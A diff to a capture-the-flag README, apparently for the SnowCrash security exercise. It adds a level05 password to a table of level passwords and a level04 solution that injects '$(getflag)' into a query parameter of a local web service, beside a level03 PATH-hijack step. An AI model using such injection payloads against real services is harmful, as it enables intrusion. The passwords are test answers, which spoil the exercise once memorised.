@@ -13,6 +13,7 @@ This project will be an introduction to cyber security.
 | flag02  | ft_waNDReL0L              |
 | level03 | kooda2puivaav1idi4f57q8iq |
 | level04 | qi0maab88jeaj46qoumi7maus |
+| level05 | ne2searoevaevoem4ov4ar8ap |
 
 ## Script
 
@@ -61,4 +62,11 @@ level03@SnowCrash:~$ strings ./level03 | grep Exploit
 level03@SnowCrash:~$ cp /bin/getflag ./echo
 level03@SnowCrash:~$ PATH=$PWD ./level03
 Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+```
+
+### level04
+
+```bash
+level04@SnowCrash:~$ curl localhost:4747?x='$(getflag)'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
